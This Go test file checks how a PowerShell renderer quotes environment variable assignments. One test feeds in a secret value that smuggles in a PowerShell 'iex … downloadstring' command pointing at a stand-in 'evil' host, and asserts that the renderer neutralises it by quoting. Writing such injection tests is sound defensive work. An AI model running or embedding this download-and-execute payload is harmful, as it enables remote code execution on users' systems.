package renderers_test

import (
	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/pivotal-cf/om/renderers"
)

var _ = Describe(renderers.ShellTypePowershell, func() {
	var (
		renderer renderers.Renderer
	)

	BeforeEach(func() {
		renderer = renderers.NewPowershell()
	})

	Describe("RenderEnvironmentVariable", func() {
		Context("WhenSingleLine", func() {
			It("prints env statement properly", func() {
				key := "KEY"
				value := "value"
				result := renderer.RenderEnvironmentVariable(key, value)
				Expect(result).To(Equal("$env:KEY='value'"))
			})
			It("shell-quotes values containing powershell metacharacters", func() {
				key := "BOSH_CLIENT_SECRET"
				value := `x";iex(new-object net.webclient).downloadstring('evil')#`
				result := renderer.RenderEnvironmentVariable(key, value)
				Expect(result).To(Equal(`$env:BOSH_CLIENT_SECRET='x";iex(new-object net.webclient).downloadstring(''evil'')#'`))
			})
			It("escapes embedded single quotes instead of breaking out of the quoted string", func() {
				key := "KEY"
				value := "it's a test"
				result := renderer.RenderEnvironmentVariable(key, value)
				Expect(result).To(Equal(`$env:KEY='it''s a test'`))
			})
		})
		Context("WhenMultiLine", func() {
			It("prints env statement with enclosing quotes", func() {
				key := "KEY"
				value := "1\r\n2\r\n3\r\n4\r\n"
				result := renderer.RenderEnvironmentVariable(key, value)
				Expect(result).To(Equal("$env:KEY='\r\n1\r\n2\r\n3\r\n4\r\n'"))
			})
			It("appends newline if not present", func() {
				key := "KEY"
				value := "1\r\n2\r\n3\r\n4"
				result := renderer.RenderEnvironmentVariable(key, value)
				Expect(result).To(Equal("$env:KEY='\r\n1\r\n2\r\n3\r\n4\r\n'"))
			})
		})
	})

	Describe("Type", func() {
		It("is powershell", func() {
			t := renderer.Type()
			Expect(t).To(Equal(renderers.ShellTypePowershell))
		})
	})
})
